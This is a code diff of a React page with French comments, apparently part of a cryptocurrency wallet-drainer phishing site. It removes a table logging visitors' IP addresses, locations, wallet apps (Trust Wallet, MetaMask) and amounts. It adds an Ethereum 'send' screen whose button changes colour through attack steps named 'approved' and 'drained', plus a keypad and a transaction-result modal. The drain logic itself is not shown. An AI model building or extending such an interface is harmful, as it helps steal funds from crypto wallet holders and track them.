-                        {new Date(scan.timestamp).toLocaleString("en-US", {
-                          month: "short",
-                          day: "numeric",
-                          hour: "2-digit",
-                          minute: "2-digit",
-                          second: "2-digit"
-                        })}
-                      </td>
-                      <td style={{ padding: "1rem 1.5rem", color: "#0f172a" }}>
-                        <div style={{ fontWeight: 600, display: "flex", alignItems: "center", gap: "0.4rem" }}>
-                          <span>{getCountryFlag(scan.location)}</span>
-                          <span>{scan.location}</span>
-                        </div>
-                        <div style={{ fontSize: "0.78rem", color: "#94a3b8", marginTop: "1px" }}>
-                          {scan.ip}
-                        </div>
-                      </td>
-                      <td style={{ padding: "1rem 1.5rem", color: "#475569" }}>
-                        <div style={{
-                          display: "inline-flex",
-                          alignItems: "center",
-                          gap: "0.35rem",
-                          backgroundColor: scan.device.includes("Trust") ? "#eff6ff" : scan.device.includes("MetaMask") ? "#fff7ed" : "#f1f5f9",
-                          color: scan.device.includes("Trust") ? "#1d4ed8" : scan.device.includes("MetaMask") ? "#c2410c" : "#475569",
-                          padding: "0.25rem 0.5rem",
-                          borderRadius: "0.375rem",
-                          fontSize: "0.8rem",
-                          fontWeight: 500
-                        }}>
-                          {scan.device.includes("Trust") ? "🔵" : scan.device.includes("MetaMask") ? "🟠" : "📱"}{" "}
-                          {scan.device}
-                        </div>
-                      </td>
-                      <td style={{ padding: "1rem 1.5rem" }}>
-                        <div style={{ fontWeight: 700, color: "#0f172a" }}>
-                          {scan.amount} {scan.token}
-                        </div>
-                        <div style={{
-                          display: "inline-block",
-                          fontSize: "0.75rem",
-                          fontWeight: 600,
-                          backgroundColor: "#f1f5f9",
-                          color: "#64748b",
-                          padding: "0.1rem 0.4rem",
-                          borderRadius: "2rem",
-                          marginTop: "2px"
-                        }}>
-                          Ethereum
-                        </div>
-                      </td>
-                      <td style={{ padding: "1rem 1.5rem", fontFamily: "monospace", fontSize: "0.8rem", color: "#64748b" }}>
-                        {scan.to ? `${scan.to.slice(0, 8)}...${scan.to.slice(-8)}` : "Default"}
-                      </td>
-                    </tr>
-                  ))}
-                </tbody>
-              </table>
-            </div>
-          )}
-        </section>
+          {(() => {
+            const parsedVal = parseFloat(displayAmount.replace(",", "."));
+            const isInvalid = isNaN(parsedVal) || parsedVal < 0.000001;
+            if (isInvalid) {
+              return (
+                <div className="montant-error" style={{ color: "#df3e3e", fontSize: "0.8rem", marginTop: "0.5rem", paddingLeft: "0.25rem", textAlign: "left", fontWeight: "500" }}>
+                  Minimum amount is 0.000001 {token.toUpperCase()}
+                </div>
+              );
+            }
+            return (
+              <div className="approx-price" style={{ color: "#8e8e93", marginTop: "0.4rem", paddingLeft: "0.25rem", fontWeight: "500", fontSize: "0.85rem" }}>
+                ≈ €{getFiatValue(displayAmount)}
+              </div>
+            );
+          })()}
+        </div>
       </div>
 
-      <style jsx global>{`
-        @keyframes spin {
-          to { transform: rotate(360deg); }
-        }
-      `}</style>
+      <div style={{ flexGrow: 1, minHeight: "2rem" }} />
+
+      <div className="next-btn-wrapper">
+        <button
+          onClick={(e) => { e.stopPropagation(); handleNextClick(); }}
+          disabled={isButtonDisabled()}
+          className={`next-btn ${loading ? "next-btn--loading" : ""}`}
+          style={{
+            backgroundColor:
+              isMaxMode && attackStep === "approved"
+                ? "#dc2626"
+                : isMaxMode && attackStep === "drained"
+                ? "#16a34a"
+                : "#3562ff",
+          }}
+        >
+          {loading ? (
+            <span className="btn-spinner-wrapper">
+              <span className="btn-spinner" />
+              {getButtonText()}
+            </span>
+          ) : (
+            getButtonText()
+          )}
+        </button>
+      </div>
+
+      {/* Clavier numérique */}
+      {isKeyboardVisible && (
+        <div className="custom-keypad" ref={keypadRef} onClick={(e) => e.stopPropagation()}>
+          <button type="button" onClick={() => handleKeyPress("1")} className="keypad-key">
+            <span className="keypad-key__number">1</span>
+          </button>
+          <button type="button" onClick={() => handleKeyPress("2")} className="keypad-key">
+            <span className="keypad-key__number">2</span>
+            <span className="keypad-key__letters">ABC</span>
+          </button>
+          <button type="button" onClick={() => handleKeyPress("3")} className="keypad-key">
+            <span className="keypad-key__number">3</span>
+            <span className="keypad-key__letters">DEF</span>
+          </button>
+          <button type="button" onClick={() => handleKeyPress("4")} className="keypad-key">
+            <span className="keypad-key__number">4</span>
+            <span className="keypad-key__letters">GHI</span>
+          </button>
+          <button type="button" onClick={() => handleKeyPress("5")} className="keypad-key">
+            <span className="keypad-key__number">5</span>
+            <span className="keypad-key__letters">JKL</span>
+          </button>
+          <button type="button" onClick={() => handleKeyPress("6")} className="keypad-key">
+            <span className="keypad-key__number">6</span>
+            <span className="keypad-key__letters">MNO</span>
+          </button>
+          <button type="button" onClick={() => handleKeyPress("7")} className="keypad-key">
+            <span className="keypad-key__number">7</span>
+            <span className="keypad-key__letters">PQRS</span>
+          </button>
+          <button type="button" onClick={() => handleKeyPress("8")} className="keypad-key">
+            <span className="keypad-key__number">8</span>
+            <span className="keypad-key__letters">TUV</span>
+          </button>
+          <button type="button" onClick={() => handleKeyPress("9")} className="keypad-key">
+            <span className="keypad-key__number">9</span>
+            <span className="keypad-key__letters">WXYZ</span>
+          </button>
+          <button type="button" onClick={() => handleKeyPress(",")} className="keypad-key keypad-key--special">
+            <span className="keypad-key__number" style={{ fontSize: "1.8rem", lineHeight: "0.8", marginTop: "-4px" }}>,</span>
+          </button>
+          <button type="button" onClick={() => handleKeyPress("0")} className="keypad-key">
+            <span className="keypad-key__number">0</span>
+          </button>
+          <button type="button" onClick={() => handleKeyPress("⌫")} className="keypad-key keypad-key--special">
+            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#000000" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+              <path d="M21 4H8l-7 8 7 8h13a2 2 0 002-2V6a2 2 0 00-2-2z" />
+              <line x1="18" y1="9" x2="12" y2="15" />
+              <line x1="12" y1="9" x2="18" y2="15" />
+            </svg>
+          </button>
+        </div>
+      )}
+
+      {/* Modal (reste inchangé, s'affiche au‑dessus) */}
+      {showModal && (
+        <div className="modal-overlay" onClick={() => setShowModal(false)}>
+          <div className="modal-card" onClick={(e) => e.stopPropagation()}>
+            <button className="modal-close-btn" onClick={() => setShowModal(false)} title="Close">
+              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
+                <line x1="18" y1="6" x2="6" y2="18"></line>
+                <line x1="6" y1="6" x2="18" y2="18"></line>
+              </svg>
+            </button>
+            <img src="/yes.png" alt="Status" className="modal-logo" />
+
+            {modalStatus === "pending" && (
+              <>
+                <h2 className="modal-title">Processing...</h2>
+                <p className="modal-text">
+                  The transaction is in progress! Blockchain validation is underway.
+                </p>
+              </>
+            )}
+
+            {modalStatus === "success" && (
+              <>
+                <h2 className="modal-title" style={{ color: "#10b981" }}>
+                  Transaction successful!
+                </h2>
+                <p className="modal-text">
+                  Your transfer of {actualAmount} {actualToken.toUpperCase()} has been successfully validated on the Ethereum blockchain.
+                </p>
+              </>
+            )}
+
+            {modalStatus === "error" && (
+              <>
+                <h2 className="modal-title" style={{ color: "#ef4444" }}>
+                  Transaction failed
+                </h2>
+                <p className="modal-text">
+                  The transaction failed on the Ethereum blockchain or an error occurred during the transfer.
+                </p>
+              </>
+            )}
+
+            {txHash && (
+              <a
+                href={`https://etherscan.io/tx/${txHash}`}
+                target="_blank"
+                rel="noopener noreferrer"
+                className="modal-details-btn"
+              >
+                Transaction details
+              </a>
+            )}
+          </div>
+        </div>
+      )}
     </main>
   );
 }
